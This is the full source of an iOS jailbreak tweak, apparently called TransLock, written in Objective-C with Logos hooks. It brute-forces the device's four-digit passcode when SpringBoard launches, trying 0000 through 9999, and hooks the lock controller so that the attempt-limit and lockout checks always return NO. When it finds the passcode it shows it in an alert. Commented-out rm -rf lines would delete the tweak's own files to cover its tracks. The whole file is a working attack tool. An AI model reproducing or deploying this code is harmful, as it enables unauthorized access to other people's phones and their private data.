@interface SBDeviceLockController
+ (id)sharedController;
- (BOOL)attemptDeviceUnlockWithPassword:(id)password appRequested:(BOOL)requested;
@end

@interface SBLockScreenManager
+ (id)sharedInstance;
- (_Bool)attemptUnlockWithPasscode:(id)arg1;
@end

@interface TransLock : NSObject
+ (id)sharedInstance;
- (void)bruteforce;
@end

NSString *numString;

@implementation TransLock
+ (instancetype)sharedInstance {
	static TransLock *__sharedInstance;
	static dispatch_once_t onceToken;
    
	dispatch_once(&onceToken, ^{
		__sharedInstance = [[self alloc] init];
	});

	return __sharedInstance;
}

- (void)bruteforce {
	for (int i = 0; i <= 9999; i++)
	{
		numString = [NSString stringWithFormat:@"%04d", i];
		NSLog(@"Testing : %@", numString);
		if ([[%c(SBDeviceLockController) sharedController] attemptDeviceUnlockWithPassword:numString appRequested:NO]) {
			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
			NSLog(@"Password is : %@", numString);
			// system("rm -rf /Library/MobileSubstrate/DynamicLibraries/libTransLock.dylib");
			// system("rm -rf /Library/MobileSubstrate/DynamicLibraries/libTransLock.plist");
			break;
		}
	}

}
@end 

%hook SBFDeviceLockController
- (bool)_temporarilyBlocked {
	return NO;
}

- (bool)isPasscodeLockedOrBlocked {
	return NO;
}

- (bool)isBlocked {
	return NO;
}
%end

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)arg1 {
	%orig;

	[[TransLock sharedInstance] bruteforce];
}
%end